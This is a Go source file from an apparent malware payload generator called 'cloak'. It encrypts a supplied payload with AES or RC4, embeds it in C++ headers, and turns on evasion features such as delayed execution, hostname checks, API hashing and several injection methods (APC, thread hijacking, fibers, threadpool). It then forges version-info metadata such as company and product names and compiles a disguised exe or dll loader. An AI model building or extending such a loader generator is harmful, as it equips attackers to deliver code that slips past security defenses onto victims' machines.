package api

import (
	"cloak/api/transport"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"

	gecko "github.com/HackLike-co/Gecko/Gecko"
)

func Generate(w http.ResponseWriter, r *http.Request) {

}

func generate(g transport.Generate) ([]byte, error) {

	// open Payload.hpp file
	pFile, err := os.OpenFile("./cloak/include/Payload.hpp", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer pFile.Close()

	// check for encryption
	switch g.EncryptionAlgo {
	case "aes":
		key, err := gecko.GenerateKey()
		if err != nil {
			return nil, err
		}

		iv, err := gecko.GenerateIV()
		if err != nil {
			return nil, err
		}

		// encrypt payload
		ePayload, err := gecko.AES_CBCEncrypt(g.Payload, key, iv)
		if err != nil {
			log.Fatal(err)
		}

		output := fmt.Sprintf("#pragma once\n\n%s\n\n%s\n\n%s", gecko.C_FormatArray(ePayload, "Payload"), gecko.C_FormatArray(key, "Key"), gecko.C_FormatArray(iv, "IV"))

		// write updated payload
		pFile.WriteString(output)
	case "rc4":
		key, err := gecko.GenerateKey()
		if err != nil {
			return nil, err
		}

		// encrypt payload
		ePayload, err := gecko.RC4_Encrypt(g.Payload, key)
		if err != nil {
			log.Fatal(err)
		}

		output := fmt.Sprintf("#pragma once\n\n%s\n\n%s", gecko.C_FormatArray(ePayload, "Payload"), gecko.C_FormatArray(key, "Key"))

		// write updated payload
		pFile.WriteString(output)
	case "none":
		output := fmt.Sprintf("#pragma once\n\n%s", gecko.C_FormatArray(g.Payload, "Payload"))

		// write updated payload
		pFile.WriteString(output)
	default:
		return nil, errors.New("invalid encryption type")
	}

	// open Config.hpp file
	configFile, err := os.OpenFile("./cloak/include/Config.hpp", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer configFile.Close()

	configOutput := "#pragma once\n\n#ifndef CONFIG_H\n#define CONFIG_H\n\n"

	if g.OutputFormat == "dll" {
		configOutput += "#define DLL\n\n"
	}

	switch g.EncryptionAlgo {
	case "aes":
		configOutput += "#define AES\n\n"
	case "rc4":
		configOutput += "#define RC4\n\n"
	}

	if g.ExecDelay > 0 {
		configOutput += fmt.Sprintf("#define DELAY %d\n\n", g.ExecDelay)

	}

	if g.Debug {
		configOutput += "#define DEBUG\n\n"
	}

	if g.CheckHostname {
		configOutput += fmt.Sprintf("#define CHECK_HOSTNAME\n\n#ifdef CHECK_HOSTNAME\n#define HOSTNAME \"%s\"\nBOOL CheckHostname(IN LPSTR pwGuardHost);\n#endif\n\n", g.Hostname)
	}

	if g.DoApiHashing {
		// generate rand
		r := rand.Intn(255-1) + 1
		configOutput += fmt.Sprintf("#define HASH_API\n#define RAND 0x%02X\n\n", r)
	}

	switch g.ExecutionMethod {
	case "inject":
		switch g.InjectMethod {
		case "local-thread":
			configOutput += "#define LOCAL_THREAD\n\n"
		case "local-hijack":
			configOutput += "#define LOCAL_THREAD_HIJACK\n\n"
		case "local-hijack-enum":
			configOutput += "#define LOCAL_THREAD_HIJACK_ENUM\n\n"
		case "apc":
			configOutput += "#define APC_INJECT\n\n"
		default:
			return nil, errors.New("invalid injection method")
		}
	case "fibers":
		configOutput += "#define FIBERS\n\n"
	case "threadpool":
		configOutput += "#define THREADPOOLWAIT\n\n"
	default:
		return nil, errors.New("invalid execution method")
	}

	configOutput += "#define WAIT_TIME INFINITE\n\n#endif"

	// write to config file
	configFile.WriteString(configOutput)

	// if dll, open main file and replace exported function name
	if g.OutputFormat == "dll" {
		replaceFuncName("./cloak/src/Main.cpp", "Start", g.ExportedFunc)
	}

	// open resource file
	rFile, err := os.OpenFile("./cloak/cloak.rc", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer rFile.Close()

	var resrcOutput string

	if g.Icon != "none" && g.Icon != "invalid" {
		resrcOutput += fmt.Sprintf("ID ICON icons/%s.ico\n", g.Icon)
	}

	resrcOutput += "1 VERSIONINFO\n"
	resrcOutput += fmt.Sprintf("FILEVERSION %s\nBEGIN\n\tBLOCK \"StringFileInfo\"\n\tBEGIN\n\t\tBLOCK\"040904E4\"\n\t\tBEGIN\n", g.FileVersion)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"CompanyName\", \"%s\"\n", g.CompanyName)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"FileDescription\", \"%s\"\n", g.FileDescription)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"InternalName\", \"%s\"\n", g.InternalName)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"OriginalFilename\", \"%s\"\n", g.OriginalFilename)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"LegalCopyright\", \"%s\"\n", g.Copyright)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"ProductName\", \"%s\"\n", g.ProductName)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"ProductVersion\", \"%s\"\n", g.ProductVersion)
	resrcOutput += "\t\tEND\n\tEND\n\tBLOCK\"VarFileInfo\"\n\tBEGIN\n\t\tVALUE \"Translation\", 0x409, 1252\n\tEND\nEND"

	// write to resource file
	rFile.WriteString(resrcOutput)

	// run make
	var cmd string
	if g.OutputFormat == "dll" {
		cmd = "make dll -C ./cloak/"
	} else {
		cmd = "make exe -C ./cloak/"
	}
	cmdNoReturn(cmd)

	// read generated file
	var fPayload []byte
	if g.OutputFormat == "dll" {
		fPayload, err = os.ReadFile("./cloak/bin/cloak.dll")
		if err != nil {
			return nil, err
		}
	} else {
		fPayload, err = os.ReadFile("./cloak/bin/cloak.exe")
		if err != nil {
			return nil, err
		}
	}

	// replace function name back to start if dll
	if g.OutputFormat == "dll" {
		replaceFuncName("./cloak/src/Main.cpp", g.ExportedFunc, "Start")
	}

	// return generated payload
	return fPayload, nil
}

func cmdNoReturn(c string) {
	cmd := exec.Command("bash", "-c", c)
	cmd.Run()
}

func replaceFuncName(fPath string, og string, new string) error {
	f, err := os.ReadFile(fPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(f), "\n")

	for i, line := range lines {
		if strings.Contains(line, fmt.Sprintf("DLLEXPORT VOID %s", og)) {
			lines[i] = fmt.Sprintf("DLLEXPORT VOID %s() {", new)
		}
	}

	out := strings.Join(lines, "\n")
	err = os.WriteFile(fPath, []byte(out), 0755)
	if err != nil {
		return err
	}

	return nil
}
